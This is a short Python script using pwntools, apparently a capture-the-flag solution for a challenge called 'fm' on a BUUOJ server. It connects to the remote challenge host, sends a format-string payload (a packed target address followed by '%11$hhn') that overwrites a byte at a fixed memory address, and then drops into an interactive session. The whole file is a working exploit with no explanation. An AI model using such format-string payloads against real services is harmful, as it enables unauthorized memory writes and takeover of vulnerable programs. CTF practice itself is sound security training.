from pwn import *

# io = process('fm')
io = remote('node4.buuoj.cn', 27792)
target_num = 0x0804A02C

payload = p32(target_num) + b'%11$hhn'
io.sendline(payload)
io.interactive()

